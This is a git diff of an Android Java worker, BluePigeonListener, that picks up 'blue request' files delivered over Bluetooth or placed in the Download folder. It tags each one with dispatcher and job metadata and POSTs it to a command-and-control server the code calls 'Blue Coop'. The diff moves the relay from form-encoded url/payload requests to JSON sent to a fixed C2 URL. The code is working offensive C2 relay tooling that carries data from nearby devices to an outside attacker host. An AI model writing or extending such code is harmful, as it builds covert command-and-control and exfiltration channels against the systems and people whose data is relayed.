@@ -31,15 +31,13 @@ import java.util.ArrayList;
 
 public class BluePigeonListener extends Worker {
     final String TAG = "BluePigeonListener ";
-    final String BT_ADDRESS_KEY = "address";
-    final String BLUE_REQ_URL_KEY = "Url";
-    final String BLUE_REQ_PAYLOAD_KEY = "Payload";
+    final String BLUE_DISP_ADDRESS_KEY = "blueDispAddress";
+    final String BLUE_DISP_NAME_KEY = "blueDispName";
+    final String BLUE_PIG_NAME_KEY = "bluePigName";
 
     File bluetoothDir = new File(Config.BLUETOOTH_DIR_PATH);
-
     BlueChirp blueChirp;
-    String jobid;
-    String btAddress;
+
     public BluePigeonListener(
             @NonNull Context context,
             @NonNull WorkerParameters params) {
@@ -50,13 +48,13 @@ public class BluePigeonListener extends Worker {
     @Override
     public ListenableWorker.Result doWork() {
         blueChirp = new BlueChirp(Config.LOGGING_DIR_PATH);
-        btAddress = getInputData().getString(BT_ADDRESS_KEY);
-        String bpName = getInputData().getString("bpName");
-        String blueCoopName = getInputData().getString("blueCoopName");
+        String blueDispAddress = getInputData().getString(BLUE_DISP_ADDRESS_KEY);
+        String blueDispName = getInputData().getString(BLUE_DISP_NAME_KEY);
+        String bluePigName = getInputData().getString(BLUE_PIG_NAME_KEY);
         Long tsLong = System.currentTimeMillis()%100000;
-        jobid = tsLong.toString();
+        String jobid = tsLong.toString();
 
-        // check if blue request exists in either bluetooth or download folder
+        // check if blue request (message from blue dispatcher) exists in either bluetooth or download folder
         File[] bluetoothDirFiles = bluetoothDir.listFiles();
         File downloadDir = new File(Config.DOWNLOAD_DIR_PATH);
         File[] downloadDirFiles = downloadDir.listFiles();
@@ -72,7 +70,7 @@ public class BluePigeonListener extends Worker {
             }
         }
 
-        // if blue requests exist
+        // if blue request exists
         if (blueReq != null) {
             try {
                 //new BlueChirp(telegramHeader + "tweet tweet i received a steaming load from BP: " + blueReq.getName()).execute();
@@ -82,15 +80,12 @@ public class BluePigeonListener extends Worker {
                 String blueReqStr = readFileContent(blueReq);
                 blueChirp.log(TAG + "doWork: file content: " + blueReqStr, "debug");
 
-                // parse blue request
-                ArrayList<String> insectRequest = parseBlueReq(blueReqStr);
-                String url = insectRequest.get(0);
-                String payload = insectRequest.get(1);
-                blueChirp.log(TAG + "doWork: url = " + url + " payload = " + payload, "debug");
-                blueChirp.log(TAG + "doWork: payload length " + payload.length(), "debug");
+                // add metadata to blue request
+                String payload = blueReqMeta(blueReqStr, blueDispAddress, blueDispName, bluePigName, jobid);
+                blueChirp.log(TAG + "doWork: final payload " + payload, "debug");
 
                 // send to C2 Server a.k.a. Blue Coop
-                String response = sendToC2(url, payload, btAddress);
+                String response = sendToC2(payload);
                 blueChirp.log(TAG + "doWork: C2 response is " + response, "debug");
 
             } catch (Exception e) {
@@ -138,48 +133,54 @@ public class BluePigeonListener extends Worker {
     }
 
     /***
-     * Parse a Blue Request and extract url, payload
+     * Parse blue request and add in metadata
      * @param jsonStr
-     * @return ArrayList with url and payload
+     * @param blueDispAddress
+     * @param blueDispName
+     * @param bluePigName
+     * @param jobid
+     * @return blue request with metadata
      * @throws JSONException
      */
-    private ArrayList<String> parseBlueReq(String jsonStr) throws JSONException {
-        blueChirp.log(TAG + "parseBlueReq: parsing blue request...", "debug");
-        ArrayList<String> result = new ArrayList<>();
+    private String blueReqMeta(String jsonStr, String blueDispAddress, String blueDispName, String bluePigName, String jobid) throws JSONException {
+        blueChirp.log(TAG + "blueReqMeta: adding metadata to blue request...", "debug");
+        String finalPayload = "";
         try {
             JSONObject json = new JSONObject(jsonStr);
-            String url = json.getString(BLUE_REQ_URL_KEY);
-            String payload = json.getString(BLUE_REQ_PAYLOAD_KEY);
-            result.add(url);
-            result.add(payload);
+            json.put("BlueDispatcherAddress", blueDispAddress);
+            json.put("BlueDispatcherName", blueDispName);
+            json.put("BluePigeonName", bluePigName);
+            json.put("JobID", jobid);
+            finalPayload = json.toString();
         } catch (JSONException e) {
-            blueChirp.log(TAG + "parseBlueReq: parsing blue request failed", "error");
+            blueChirp.log(TAG + "blueReqMeta: failed to add metadata to blue request", "error");
             throw e;
         }
-        blueChirp.log(TAG + "successfully parsed blue request", "debug");
-        return result;
+        blueChirp.log(TAG + "blueReqMeta: successfully added metadata to blue request", "debug");
+        return finalPayload;
     }
-    
+
     /***
-     * Sends base64 payload string to Blue Coop, creates a file to store the HTTP response
-     * @param urlString, payload, address(without colons)
-     * @return arraylist with url, payload
+     * Sends json string payload to Blue Coop
+     * @param payload
+     * @return Blue Coop response
+     * @throws IOException
+     * @throws JSONException
      */
-    private String sendToC2(String urlString, String payload, String address) throws IOException, JSONException {
+    private String sendToC2(String payload) throws IOException, JSONException {
         blueChirp.log(TAG + "sendToC2: sending to Blue Coop...", "debug");
 
         String response = null;
         try {
-            // url encode payload
-            payload = "p=" + URLEncoder.encode(payload, "utf-8");
+            // put payload in post data
             byte[] postData = payload.getBytes( StandardCharsets.UTF_8 );
             int postDataLength = postData.length;
 
             // send POST request to C2
-            String c2Url = MainActivity.BLUE_COOP_URL + urlString;
+            String c2Url = MainActivity.BLUE_COOP_URL;
             URL url = new URL(c2Url);
             HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
-            httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            httpURLConnection.setRequestProperty("Content-Type", "application/json");
             httpURLConnection.setRequestProperty("Accept-Language", "en-SG");
             httpURLConnection.setRequestProperty("charset", "utf-8");
             httpURLConnection.setRequestProperty("Content-Length", Integer.toString(postDataLength ));
@@ -209,7 +210,7 @@ public class BluePigeonListener extends Worker {
             // blueResp.delete();
             throw e;
         }
-        blueChirp.log(TAG + "sendToC2: Successfully sent to Blue Coop", "debug");
+        blueChirp.log(TAG + "sendToC2: Successfully sent to Blue Coop", "info");
         return response;
     }
 }
